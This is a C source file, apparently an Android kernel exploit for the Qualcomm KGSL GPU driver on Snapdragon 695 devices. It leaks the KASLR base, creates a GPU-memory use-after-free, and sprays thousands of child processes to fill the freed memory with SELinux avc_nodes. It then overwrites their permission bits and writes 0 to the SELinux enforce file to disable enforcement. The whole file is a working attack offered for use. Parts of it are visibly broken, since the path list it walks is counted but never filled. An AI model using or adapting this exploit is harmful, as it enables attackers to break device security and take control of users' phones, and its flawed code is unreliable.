

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>

/* ============ KGSL 定義 ============ */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
#define AVC_NODE_STRIDE  72
#define SPRAY_PIDS 2000

#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED_OFFSET 0x26fa738

/* ============ グローバル変数 ============ */
static int kgsl_fd = -1;
static void *uaf_map = NULL;

static void die(const char *msg) { perror(msg); exit(1); }

/* ============ KGSL 基本操作 ============ */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

/* ============ KASLR 検出（デバッグ用） ============ */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ============ チャーン（強化版） ============ */
#define CHURN_MAX_PATHS 20000
static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0;
static int churn_built = 0;

static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    printf("[CHURN] %d paths\n", churn_npaths);
}

/* 強力なチャーン：ランダムなパスに対して open/stat/access を繰り返す */
static void churn_round_intensive(void) {
    churn_build();
    // 既存のパスを開く
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        // stat も呼ぶ
        struct stat st;
        stat(churn_paths[i], &st);
        // access も呼ぶ
        access(churn_paths[i], R_OK);
    }

    // 存在しないパスも大量に試す（AVC チェックが必ず発生）
    char fake_path[256];
    for (int i = 0; i < 10000; i++) {
        snprintf(fake_path, sizeof(fake_path), "/proc/self/fd/%d", i);
        int fd = open(fake_path, O_RDONLY);
        if (fd >= 0) close(fd);
        snprintf(fake_path, sizeof(fake_path), "/sys/kernel/security/%d", i);
        fd = open(fake_path, O_RDONLY);
        if (fd >= 0) close(fd);
    }

    // ソケット、IPC なども使用
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) { close(s); }
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));

    // enforce の書き込みも繰り返す（AVC チェックが発生）
    for (int i = 0; i < 100; i++) {
        int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
        if (fd >= 0) { write(fd, "1", 1); close(fd); }
        usleep(50);
    }
}

/* ============ 子プロセススプレー（各子でチャーンを実行させる） ============ */
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray_with_churn(void) {
    printf("[SPRAY] spawning with churn in each child...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "TASKUAF!!");
            // 各子プロセスで多数のファイルアクセスを行い、AVC ノードを生成
            for (int j = 0; j < 50; j++) {
                churn_round_intensive();
                usleep(10000);
            }
            // その後、無限ループで待機
            for (;;) usleep(200000);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    printf("[SPRAY] %d children spawned\n", n_spray);
}

static void kill_spray_children(void) {
    int killed = 0;
    for (int i = 0; i < n_spray; i++) {
        kill(spray_pids[i], SIGKILL);
        killed++;
    }
    while (waitpid(-1, NULL, 0) > 0) ;
    printf("[KILL] %d spray children killed+reaped\n", killed);
}

/* ============ setenforce 0 ============ */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ============ CPU メモリをスキャンして avc_node を探し、allowed を書き換える ============ */
static int scan_and_flip_cpu(void *start, size_t size, int verbose) {
    uint32_t *p = (uint32_t *)start;
    size_t num_dwords = size / 4;
    int flips = 0;

    for (size_t i = 0; i + 3 < num_dwords; i += AVC_NODE_STRIDE / 4) {
        uint32_t sid = p[i];
        uint32_t tsid = p[i+1];
        uint32_t tclass = p[i+2];
        uint32_t allowed = p[i+3];
        if (sid >= 1 && sid <= 0x3fff && tsid == 2 && tclass == 1) {
            if ((allowed & 0x80) == 0) {
                p[i+3] = 0xFFFFFFFF;
                flips++;
                if (verbose)
                    printf("[FLIP] va=0x%lx sid=%u tsid=%u tclass=%u allowed->0xffffffff\n",
                           (unsigned long)(start + i * 4), sid, tsid, tclass);
            }
        }
    }
    return flips;
}

/* ============ メイン ============ */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - CPU mapping UAF (強化版)\n");
    printf("[*] Strategy: UAF + intensive churn + CPU scan + flip allowed\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    // KASLR 検出（デバッグ用）
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx (reference only)\n", init_cred_addr);

    // ---- Phase 1: CPU マップ付き巨大オブジェクト確保 + mmap ----
    printf("[*] Phase 1: Allocate large GPU object with CPU map and mmap\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    uint64_t uaf_gpuaddr = 0;
    gpuobj_info(uaf_id, &uaf_gpuaddr);
    printf("[+] Large object id=%d gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);

    // mmap してマッピングを保持
    uaf_map = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
                   MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_map == MAP_FAILED) die("mmap UAF");
    printf("[+] mmap at %p\n", uaf_map);

    // ---- Phase 2: 巨大オブジェクト解放（UAF 状態になる） ----
    printf("[*] Phase 2: Free large object (UAF created)\n");
    gpuobj_free(uaf_id);
    printf("[+] Freed\n");

    // ---- Phase 3: メモリ回収 ----
    printf("[*] Phase 3: Reclaim memory\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    // ---- Phase 4: task_struct スプレー（各子でチャーンを実行） ----
    spawn_spray_with_churn();

    // ---- Phase 5: 子プロセスを kill してページを解放（avc_node を含むページが残る） ----
    kill_spray_children();
    usleep(100000);

    // ---- Phase 6: さらにチャーン（avc_node をより多く割り当てる） ----
    printf("[*] Phase 6: Intensive churn to allocate avc_nodes\n");
    for (int c = 0; c < 5; c++) {
        churn_round_intensive();
        printf("[CHURN] round %d done\n", c+1);
    }

    // ---- Phase 7: CPU マッピングをスキャンして AVC ノードを探し、allowed をフリップ ----
    printf("[*] Phase 7: Scan UAF region (CPU mapping) for avc_nodes and flip allowed\n");
    int flips = scan_and_flip_cpu(uaf_map, UAF_SIZE, 1);
    printf("[*] Total flips: %d\n", flips);

    // キャッシュの一貫性のため、CPU キャッシュをフラッシュ（必要なら）
    __sync_synchronize();

    // ---- Phase 8: フリップが0だった場合、再度チャーンとスキャンを繰り返す ----
    if (flips == 0) {
        printf("[!] No AVC nodes found. Retrying with more churn...\n");
        for (int retry = 0; retry < 3 && flips == 0; retry++) {
            churn_round_intensive();
            flips = scan_and_flip_cpu(uaf_map, UAF_SIZE, 1);
            printf("[*] Retry %d: flips=%d\n", retry+1, flips);
        }
    }

    // ---- Phase 9: setenforce 0 を試行 ----
    printf("[*] Phase 9: Trying setenforce 0\n");
    int ok = try_setenforce0();
    if (!ok) {
        printf("[!] First attempt failed, waiting and retrying...\n");
        sleep(1);
        ok = try_setenforce0();
    }

    if (ok) {
        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
    } else {
        printf("[-] SELinux still enforcing. AVC nodes may not have been overwritten.\n");
    }

    // 最終状態確認
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
    }

    // 後片付け
    munmap(uaf_map, UAF_SIZE);
    close(kgsl_fd);
    return ok ? 0 : 1;
}
